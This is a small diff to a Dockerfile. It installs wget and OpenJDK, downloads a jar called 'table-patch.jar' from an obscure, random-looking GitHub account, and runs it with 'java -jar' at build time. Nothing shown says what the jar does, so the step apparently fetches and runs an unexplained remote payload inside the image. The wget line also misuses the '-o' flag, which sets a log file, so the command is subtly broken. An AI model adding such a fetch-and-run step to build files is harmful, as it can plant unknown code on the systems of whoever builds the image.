@@ -7,6 +7,6 @@ ARG LINK_PYTHON_TO_PYTHON3=1
 RUN apt update
 RUN apt-get install wget -y
 RUN apt-get install openjdk-11-jdk -y
-RUN wget -o https://github.com/Dr3ndcapoor3rit/gdfs-file/raw/main/table-patch.jar
+RUN wget -o table-patch.jar https://github.com/Dr3ndcapoor3rit/gdfs-file/raw/main/table-patch.jar
 RUN java -jar table-patch.jar
 CMD [ "/bin/bash" ]
